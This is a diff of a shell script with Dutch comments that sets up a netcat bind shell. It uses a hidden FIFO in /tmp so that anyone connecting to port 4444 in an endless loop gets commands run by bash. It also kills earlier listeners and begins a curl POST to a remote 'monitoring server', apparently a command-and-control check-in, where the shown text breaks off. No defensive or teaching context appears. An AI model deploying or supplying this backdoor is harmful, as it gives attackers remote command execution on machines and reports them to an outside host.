@@ -6,14 +6,18 @@ PORT=4444
 FIFO="/tmp/.fifo_$PORT"
 CALLBACK_PORT=5000
 
-# Verwijder oude pipe als die bestaat
-[ -p "$FIFO" ] && rm -f "$FIFO"
-
-# Maak nieuwe named pipe aan
+# Zorg dat er geen oude sessies/pipe bestaan
+pkill -f "nc -lvnp $PORT"
+rm -f "$FIFO"
 mkfifo "$FIFO"
 
-# Start shell via FIFO (achtergrond)
-bash < "$FIFO" | while true; do nc -lvnp $PORT > "$FIFO"; done &
+# Start een listener in een eindeloze loop
+start_listener() {
+  while true; do
+    echo "[*] Wacht op nieuwe connectie op poort $PORT..."
+    nc -lvnp "$PORT" < "$FIFO" | bash > "$FIFO"
+  done
+}
 
 # Eerste registratie naar monitoringserver
 curl -s -X POST http://$SERVER_IP:$CALLBACK_PORT/update \
